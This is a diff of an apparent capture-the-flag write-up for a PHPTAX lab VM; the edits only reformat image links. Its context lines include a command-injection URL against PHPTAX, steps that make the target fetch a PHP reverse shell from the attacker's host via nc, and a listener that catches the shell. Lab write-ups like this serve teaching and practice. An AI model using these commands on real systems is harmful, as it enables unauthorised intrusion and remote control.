@@ -44,7 +44,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.40 seconds
 
 The port scan revealed only two open ports. Loading them up on Iceweasel showed nothing remarkable:
 
-->![](/images/2014-04-08/01.png)<-
+![](/images/2014-04-08/01.png)
 
 I tried manually typing in common directory and file names but nothing was working. This process would need to be automated with dirb or wfuzz, but first, I wanted to run nikto to see if anything interesting popped up. I started off with port 80: 
 
@@ -182,11 +182,11 @@ root@kali ~/ctf
 
 Back on Iceweasel, I used the User Agent Switcher Add-On and set the user agent to Internet Explorer 6, refreshed the webpage, and a directory index was returned:
 
-->![](/images/2014-04-08/02.png)<-
+![](/images/2014-04-08/02.png)
 
 Following through this link loaded the PHPTAX webapp (thanks for the tax season reminder loneferret):
 
-->![](/images/2014-04-08/03.png)<-
+![](/images/2014-04-08/03.png)
 
 Finally some progress. A quick Google search revealed that PHPTAX was vulnerable to [remote code execution](http://www.exploit-db.com/exploits/21665/). To test if this instance was vulnerable, I wrote the output of id into out.txt, and on another browser, I loaded out.txt and was able to view its contents: 
 
@@ -194,7 +194,7 @@ Finally some progress. A quick Google search revealed that PHPTAX was vulnerable
 http://192.168.1.159:8080/phptax/index.php?pfilez=1040pg1.tob;id > out.txt&pdf=make
 ```
 
-->![](/images/2014-04-08/04.png)<-
+![](/images/2014-04-08/04.png)
 
 I ran uname -a and the system identified itself as FreeBSD Release 9.
 
@@ -212,7 +212,7 @@ First, I copied /usr/share/webshells/php/php-reverse-shell.php to /var/www/r.txt
 printf "GET http://192.168.1.128/r.txt HTTP/1.0\r\n\r\n" > get.txt
 ```
 
-->![](/images/2014-04-08/05.png)<-
+![](/images/2014-04-08/05.png)
 
 Now it was a matter of redirecting that file to nc:
 
@@ -229,7 +229,7 @@ A quick check in /var/log/apache2/access.log showed that the target downloaded t
 
 Almost there. I setup a nc listener on my machine to listen on port 443 and loaded up r.php on the target to receive my reverse shell:
 
-->![](/images/2014-04-08/06.png)<-
+![](/images/2014-04-08/06.png)
 
 One step closer to victory. I started doing a bit of system enumeration. /root was readable and I could see the flag congrats.txt but I couldn't read it just yet due to user permissions.
 
